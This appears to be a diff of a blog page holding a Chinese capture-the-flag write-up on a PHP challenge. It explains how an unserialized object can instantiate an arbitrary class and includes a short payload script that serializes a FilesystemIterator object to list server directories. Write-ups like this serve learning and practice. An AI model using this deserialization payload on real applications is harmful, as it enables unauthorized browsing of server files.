@@ -16,7 +16,7 @@
 <meta property="og:description" content="dasctf的原题,就改了一下文件结构和类名 源码—— 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phperror_reporting(0);highlight_file(__FILE__);class XMAN&amp;#123;    pub">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-08-08T12:15:25.000Z">
-<meta property="article:modified_time" content="2021-08-08T12:30:32.573Z">
+<meta property="article:modified_time" content="2021-08-13T08:14:27.213Z">
 <meta property="article:author" content="ouroborosscr">
 <meta name="twitter:card" content="summary">
   
@@ -200,7 +200,7 @@
 <p>这句我一开始不太明白这句——</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo new  $this-&gt;class ($this-&gt;para);</span><br></pre></td></tr></table></figure>
 <p>然后搜了一下，结果就直接搜到原题了</p>
-<p>这句的意思是：$this-&gt;class函数的参数是$this-&gt;para</p>
+<p>这句的意思是：$this-&gt;class类（其实当成函数看就行）的参数是$this-&gt;para</p>
 <p>所以payload——<br>用FilesystemIterator遍历目录(把/换成文件夹，直到找到要打开的文件夹)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class&#x3D;&#39;FilesystemIterator&#39;;</span><br><span class="line">    public $para&#x3D;&quot;&#x2F;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">$o  &#x3D; new XMAN();</span><br><span class="line">echo serialize($o);</span><br></pre></td></tr></table></figure>
 
